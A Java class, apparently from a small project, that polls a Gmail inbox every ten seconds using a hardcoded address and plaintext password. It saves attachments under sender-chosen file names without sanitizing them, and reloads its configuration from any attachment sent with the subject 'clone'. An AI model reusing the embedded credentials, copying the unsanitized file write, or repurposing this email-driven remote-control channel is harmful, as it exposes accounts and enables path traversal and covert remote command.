package com.company;

import javax.mail.*;
import javax.mail.internet.MimeBodyPart;
import javax.mail.search.FlagTerm;
import java.io.*;
import java.util.ArrayList;
import java.util.Properties;
import java.util.concurrent.Future;

class MailCheckRunnable implements Runnable {

    private Thread thread;

    public MailCheckRunnable () {

    }

    @Override
    public void run() {
        try {
            Thread.sleep(10000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        while (true) {
            String host = "imap.googlemail.com";// change accordingly
            String mailStoreType = "imaps";
            String username = "soupclockcmd@gmail.com";// change accordingly
            String password = "Fluffybunny20";// change accordingly

            check(host, mailStoreType, username, password);
            try {

            Thread.sleep(10000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

    }

    public void start() {
        System.out.println(" Starting " +  this.getClass().getName() + "!");
        if (thread == null) {
            thread = new Thread (this, "MailCheckRunnable");
            thread.start();
        }
    }

    private static void check(String host, String storeType, String user, String password) {
        try {

            //create properties field
            Properties properties = new Properties();

            properties.put("mail.imap.host", host);
            properties.put("mail.imap.port", "993");
            //properties.put("mail.imap.starttls.enable", "true");
            Session emailSession = Session.getDefaultInstance(properties);

            //create the POP3 store object and connect with the pop server
            Store store = emailSession.getStore("imaps");

            store.connect(host, user, password);

            //create the folder object and open it
            Folder emailFolder = store.getFolder("INBOX");
            emailFolder.open(Folder.READ_WRITE);

            // retrieve the messages from the folder in an array and print it
            Flags seen = new Flags(Flags.Flag.SEEN);
            FlagTerm unseenFlagTerm = new FlagTerm(seen, false);
            Message[] messages = emailFolder.search(unseenFlagTerm);
            System.out.println("Unread messages: " + messages.length);
            //System.out.println("Total messages: " + emailFolder.getMessages().length);

            for (int i = 0, n = messages.length; i < n; i++) {
                Message message = messages[i];
                System.out.println("---------------------------------");
                System.out.println("Email Number " + (i + 1));
                System.out.println("Subject: " + message.getSubject());
                System.out.println("From: " + message.getFrom()[0]);
                System.out.println("Text: " + message.getContent().toString());

                if (message.getContentType().contains("multipart")) {
                    Multipart multiPart = (Multipart) message.getContent();

                    for (int j = 0; j < multiPart.getCount(); j++) {
                        MimeBodyPart part = (MimeBodyPart) multiPart.getBodyPart(j);
                        if (Part.ATTACHMENT.equalsIgnoreCase(part.getDisposition())) {
                            String path = "C:/Attachments/";
                            String destFilePath = path + part.getFileName();

                            new File(path).mkdir();

                            FileOutputStream output = new FileOutputStream(destFilePath);

                            InputStream input = part.getInputStream();

                            byte[] buffer = new byte[4096];

                            int byteRead;

                            while ((byteRead = input.read(buffer)) != -1) {
                                output.write(buffer, 0, byteRead);
                            }
                            if (message.getSubject().equals("clone")) {
                                try {
                                    Thread.sleep(500);
                                } catch (InterruptedException e) {
                                    e.printStackTrace();
                                }
                                Utils.restart("config " + destFilePath);
                            }
                        }
                    }

                }
            }

            //close the store and folder objects
            emailFolder.close(false);
            store.close();

        } catch (NoSuchProviderException e) {
            e.printStackTrace();
        } catch (MessagingException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

